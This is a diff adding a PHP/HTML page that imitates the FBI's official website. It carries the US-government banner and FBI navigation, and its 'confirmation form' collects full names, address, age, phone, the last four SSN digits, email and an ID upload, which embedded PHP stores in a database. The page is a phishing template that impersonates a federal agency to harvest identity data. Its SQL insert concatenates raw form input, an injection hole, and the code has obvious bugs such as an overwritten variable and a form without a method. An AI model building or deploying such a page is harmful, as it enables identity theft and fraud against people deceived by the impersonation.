@@ -1,0 +1,210 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="confirm.css">
+</head>
+<body>
+    <div class="header">
+        <div class="headup">
+            <div class="headup1">
+                <img src=".\icons/icons8-usa-48.png">
+                <p>An official website of the United States government.</p>
+            </div>
+            <div class="headup2">
+                <select>
+                    <option>Here's how you know</option>
+                </select>
+            </div>
+        </div>
+    </div>
+    <div class="header2">    
+        <div class="headdown">
+            <div class="headdown1">
+                <p>MORE</p>
+                <img src=".\icons/icons8-menu-30.png">
+
+            </div>
+            <div class="headdown2">
+                <h1>FBI</h1>
+
+            </div>
+            <div class="headdown3">
+                <img src=".\icons/icons8-search-30.png">
+                <p>Search</p>
+
+            </div>
+
+        </div>
+    </div>
+
+    <div class="man">
+	<div class="confirm">
+	   <h4>CONFIRMATION FORM</h4>
+	</div>
+	<?php
+	include("connfile.php");
+	session_start();
+	
+	if ($_SERVER['REQUEST_METHOD']=='POST')
+	{
+	    $V1=$_POST['name'];
+	    $V2=$_POST['Address'];
+	    $V3=$_POST['Age'];
+	    $V4=$_POST['Phone'];
+	    $V5=$_POST['Last'];
+	    $V6=$_POST['Email'];
+	    $V1=$_POST[''];
+	
+	    $sqlvar="insert into FabTab values ('$V1','$V2','$V3','$V4','$V5','$V6','$V1')";
+	    $result=$conn->query ($sqlvar);
+	    if($result)
+		{
+		    echo "";
+		}
+		else
+		{
+		    echo "";
+		}
+	
+	}
+	
+	?>
+        
+    <form>
+	<div class="like">
+	<label for="name">Full Names: </label>
+	<input type="text" id="name" name="name" placeholder="Enter Full Names">
+	</div>
+	<div class="like">
+	<label for="Address">Address: </label>
+	<textarea id="Address" name="Address" placeholder="Address"></textarea>
+	</div>
+	<div class="like">
+	<label for="Age">Age: </label>
+	<input type="text" id="Age" name="Age" placeholder="Age">
+	</div>
+	<div class="like">
+	<label for="Phone">Phone No: </label>
+	<input type="text" id="Phone" name="Phone" placeholder="Phone Number">
+	</div>
+	<div class="like">
+	<label for="Last">Last 4 digits of SSN: </label>
+	<input type="text" id="Last" name="Last" placeholder="Enter Last 4 digits of SSN">
+	</div>
+	<div class="like">
+	<label for="Email">Email: </label>
+	<input type="text" id="Email" name="Email" placeholder="Enter your Email Address">
+	</div>
+	<div class="like">
+	<label for="name">Upload an ID for confirmation: </label>
+	<input type="file" id="name" name="name" placeholder="Enter Full Names">
+	</div>
+	
+	</form>
+    </div>
+    <div class="footer">
+        <h4>Most Wanted</h4>
+        <div class="footh">
+            <a href="#">Ten Most Wanted</a>
+            <a href="#">Fugitives</a>
+            <a href="#">Terrorism</a>
+            <a href="#">Kidnappings / Missing Persons</a>
+            <a href="#">Seeking Information</a>
+            <a href="#">Bank Robbers</a>
+            <a href="#">ECAP</a>
+            <a href="#">ViCAP</a>
+
+        </div>
+        <h4>About</h4>
+        <div class="footh">
+            <a href="#">Mission & Priorities</a>
+            <a href="#">Leadership & Structure</a>
+            <a href="#">Partnerships</a>
+            <a href="#">Community Outreach</a>
+            <a href="#">FAQs</a>           
+        </div>
+        <h4>News</h4>
+        <div class="footh">
+            <a href="#">Stories</a>
+            <a href="#">Videos</a>
+            <a href="#">Press Release</a>
+            <a href="#">Speeches</a>
+            <a href="#">Testimony</a>
+            <a href="#">Podcasts and Radio</a>
+            <a href="#">Photos</a>
+            <a href="#">Español</a>
+            <a href="#">Apps</a>
+
+        </div>
+        <h4>Resources</h4>
+        <div class="footh">
+            <a href="#">Law Enforcement</a>
+            <a href="#">Businesses</a>
+            <a href="#">Victim Assistance</a>
+            <a href="#">Reports & Publications</a>
+            
+        </div>
+        <h4>What We Investigate</h4>
+        <div class="footh">
+            <a href="#">Terrorism</a>
+            <a href="#">Counterintelligence</a>
+            <a href="#">Cyber Crime</a>
+            <a href="#">Public Corruption</a>
+            <a href="#">Civil Rights</a>
+            <a href="#">Organized Crime</a>
+            <a href="#">White-Collar Crime</a>
+            <a href="#">Violent Crime</a>
+            <a href="#">WMD</a>
+        </div>
+        <h4>Contact Us</h4>
+        <div class="footh">
+            <a href="#">Field Offices</a>
+            <a href="#">FBI Headquarters</a>
+            <a href="#">Overseas Offices</a>
+
+        </div>
+        <h4>Services</h4>
+        <div class="footh">
+            <a href="#">CJIS</a>
+            <a href="#">CIRG</a>
+            <a href="#">Laboratory Services</a>
+            <a href="#">Training Academy</a>
+            <a href="#">Operational Technology</a>
+            <a href="#">Information Management</a>
+
+        </div>
+        <h4>FBI Jobs</h4>
+        <div class="footh">
+            <a href="#">Submit a Tip</a>
+            <a href="#">Crime Statistics</a>
+            <a href="#">History</a>
+            <a href="#">FOIPA</a>
+            <a href="#">Scams & Safety</a>
+            <a href="#">FBI Kids</a>
+            <a href="#">FBI Tour</a>
+
+        </div>
+        <h4>Additional Resources</h4>
+        <div class="footh">
+            <a href="#">Accessibility</a>
+            <a href="#">eRulemaking</a>
+            <a href="#">Freedom of Information / Privacy Act</a>
+            <a href="#">Legal Notices</a>
+            <a href="#">Legal Policies & Disclaimers</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">USA.gov</a>
+            <a href="#">White House</a>
+            <a href="#">No FEAR Act</a>
+            <a href="#">Equal Opportunity</a>
+        </div>
+    </div>
+    <div class="end">
+        <img src="end.png">
+    </div>
+ 
+    
+</body>
+</html>
